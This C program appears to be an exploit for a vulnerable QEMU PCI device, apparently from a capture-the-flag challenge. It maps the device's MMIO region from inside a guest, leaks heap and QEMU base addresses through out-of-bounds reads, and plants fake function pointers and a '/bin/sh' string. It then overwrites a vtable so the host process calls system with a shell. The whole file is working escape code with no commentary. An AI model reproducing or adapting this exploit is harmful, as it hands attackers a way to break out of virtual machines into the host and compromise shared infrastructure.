#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#define MMIO_SET_OFFSET 0
#define MMIO_SET_DATA 8
#define MMIO_GET_DATA 8

unsigned char *mmio_mem;

void mmio_write(uint32_t addr, uint32_t value)
{
    *(uint32_t *)(mmio_mem + addr) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *(uint32_t *)(mmio_mem + addr);
}

void set_offset_lo(uint32_t value)
{
    mmio_write(MMIO_SET_OFFSET, value);
}

void set_offset_hi(uint32_t value)
{
    mmio_write(MMIO_SET_OFFSET + 4, value);
}

void set_value(uint32_t value)
{
    mmio_write(MMIO_SET_DATA, value);
}

uint64_t get_value()
{
    return mmio_read(MMIO_GET_DATA);
}

uint64_t read_addr_offset(uint64_t offset)
{
    set_offset_lo(offset & 0xffffffff);
    set_offset_hi((offset >> 32) & 0xffffffff);
    uint64_t addr_lo = get_value();

    set_offset_lo((offset + 4) & 0xffffffff);
    set_offset_hi(((offset + 4) >> 32) & 0xffffffff);
    uint64_t addr_hi = get_value();

    return (addr_hi << 32) | addr_lo;
}

void write_addr_offset(uint64_t offset, uint32_t value)
{
    set_offset_lo(offset & 0xffffffff);
    set_offset_hi((offset >> 32) & 0xffffffff);
    set_value(value);
}

int main()
{
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);

    mmio_mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);

    uint64_t heapleak = read_addr_offset(0x120);
    uint64_t qemuleak = read_addr_offset(0x130);
    uint64_t qemubase = qemuleak - 0x7b44a0;
    uint64_t opaque = read_addr_offset(-0xbf8 + 0xd8);
    uint64_t mmio_ptr = read_addr_offset(-0xbf8 - 0x7b0);
    uint64_t target_off = opaque - mmio_ptr - 0x50;

    printf("HEAP leak     : %p\n", heapleak);
    printf("QEMU leak     : %p\n", qemuleak);
    printf("QEMU base     : %p\n", qemubase);
    printf("opaque        : %p\n", opaque);
    printf("mmio_ptr      : %p\n", mmio_ptr);
    printf("target_off    : %p\n", target_off);

    // 0x0000000000575a0e: mov rdi, qword ptr [rax + 0x10]; call qword ptr [rax];
    // 0x000000000035f5d5: call qword ptr [rax + 8];
    uint64_t system = qemubase + 0x324150;
    uint64_t setrdigadget = qemubase + 0x0000000000575a0e;

    uint64_t callrax8 = qemubase + 0x000000000035f5d5;

    write_addr_offset(0x20, callrax8 & 0xffffffff); // rax
    write_addr_offset(0x24, callrax8 >> 32);        // rax

    write_addr_offset(0x20 + 8, system & 0xffffffff); // rax+0x8
    write_addr_offset(0x20 + 4 + 8, system >> 32);    // rax+0x8

    write_addr_offset(0x20 + 0x10, ((heapleak + 0x1d20) & 0xffffffff) + 0x10); // rax + 0x10 => address of bin/sh
    write_addr_offset(0x24 + 0x10, heapleak >> 32);

    write_addr_offset(0x20 + 8 + 0x10, 0x6e69622f); // rax+0x18 => bin/sh
    write_addr_offset(0x20 + 8 + 0x10 + 4, 0x68732f);

    write_addr_offset(0x20 + 0x38, setrdigadget & 0xffffffff); // gadget (call [rax])
    write_addr_offset(0x24 + 0x38, setrdigadget >> 32);

    write_addr_offset(-0xbf8 - target_off, opaque + 0xbf8 + 0x20); // overwrite vtable

    munmap(mmio_mem, 0x1000);
    close(mmio_fd);
}
